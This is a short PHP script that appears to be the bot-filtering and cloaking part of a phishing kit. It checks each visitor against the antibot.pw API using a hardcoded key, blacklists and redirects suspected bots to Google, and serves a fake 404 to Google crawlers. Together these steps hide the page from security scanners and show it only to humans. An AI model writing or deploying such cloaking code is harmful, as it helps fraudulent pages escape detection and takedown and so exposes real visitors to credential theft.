<?php 

define("ANTIBOT_API", '182525f2cbc514fb29681b9dab0e85d8aaaa');

error_reporting(0);
session_start();




function passport() {
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOT_API .'&ua=' . $ua),true);
    $is_bot = $check['is_bot'];
    if( $is_bot == 1) {
        file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['passport'] = 1;
    }
    if( $_SESSION['passport'] == 1 )
        return;
    $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }

}
   passport();
   
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv('REMOTE_ADDR')),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   
?>



